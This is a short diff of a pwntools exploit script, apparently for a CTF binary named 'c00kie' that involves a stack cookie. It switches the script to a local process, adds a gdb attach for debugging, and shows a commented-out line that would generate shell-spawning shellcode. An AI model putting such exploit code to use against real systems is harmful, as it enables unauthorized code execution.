@@ -2,7 +2,7 @@ from pwn import *
 
 context(os='linux', arch='i386')
 
-local=False
+local=True
 def conn():
 	return process("./c00kie") if local else remote("127.0.0.1","9999")
 
@@ -26,6 +26,7 @@ def pwn1():
 #pwn
 def pwn2():
 	r1=conn()
+	gdb.attach(r1,''' ''')
 	global cookie
 	log.info("cookie:"+hex(cookie))
 	#shellcode = asm(shellcraft.i386.linux.sh())
